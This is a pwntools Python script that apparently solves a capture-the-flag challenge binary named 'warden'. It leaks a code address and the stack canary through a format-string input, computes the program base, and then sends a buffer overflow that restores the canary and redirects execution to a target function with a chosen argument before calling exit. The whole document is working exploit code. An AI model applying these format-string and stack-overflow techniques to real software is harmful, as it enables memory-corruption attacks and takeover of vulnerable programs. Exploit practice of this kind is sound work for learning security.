from pwn import *
context.arch = 'i386'

p = process('./warden')
p.recvuntil(b'My defense is too solid to be breached.\n')

# Leak
p.sendline(b'%3$08x|%15$08x')
output = p.recvuntil(b'Pow Pow Pow\n')
values = output.split(b'Pow')[0].strip().split(b'|')
code_leak = int(values[0], 16)
canary = int(values[1], 16)

base = code_leak - 0x1433
braum = base + 0x12cd
exit_plt = base + 0x1150  # exit@plt

print(f"Base: {hex(base)}")

# Call braum then exit
payload = b'A' * 32
payload += p32(canary)
payload += p32(0)
payload += p32(0)
payload += p32(braum)
payload += p32(exit_plt)  # return to exit
payload += p32(0x1337)  # arg for braum
payload += p32(0)  # arg for exit

p.sendline(payload)
sleep(0.5)
print("Exit code:", p.poll(block=True))
